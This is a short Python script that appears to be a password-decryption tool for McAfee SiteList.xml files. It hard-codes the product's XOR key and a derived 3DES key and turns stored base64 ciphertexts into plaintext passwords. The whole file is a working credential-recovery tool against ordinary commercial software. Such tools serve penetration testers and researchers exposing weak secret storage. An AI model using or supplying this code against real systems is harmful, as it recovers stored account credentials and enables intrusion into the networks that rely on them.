#!/usr/bin/env python3
# Info: 
#    McAfee Sitelist.xml password decryption tool#
###########################################################################

import sys
import base64
from Crypto.Cipher import DES3
from Crypto.Hash import SHA

KEY = bytes.fromhex("12150F10111C1A060A1F1B1817160519")

def sitelist_xor(xs):
    return bytes([c ^ KEY[i % 16] for i, c in enumerate(xs)])

def des3_ecb_decrypt(data):
    key = SHA.new(b'<!@#$%^>').digest() + b"\x00\x00\x00\x00"
    des3 = DES3.new(key, DES3.MODE_ECB)
    decrypted = des3.decrypt(data)
    return decrypted[:decrypted.find(b'\x00')].decode(errors='ignore') or "<empty>"

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage:   %s <base64 passwd>" % sys.argv[0])
        print("Example: %s 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='" % sys.argv[0])
        sys.exit(0)
    encrypted_password = base64.b64decode(sys.argv[1]) 
    password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
    print("Crypted password   : %s" % sys.argv[1])
    print("Decrypted password : %s" % password)

    sys.exit(0)
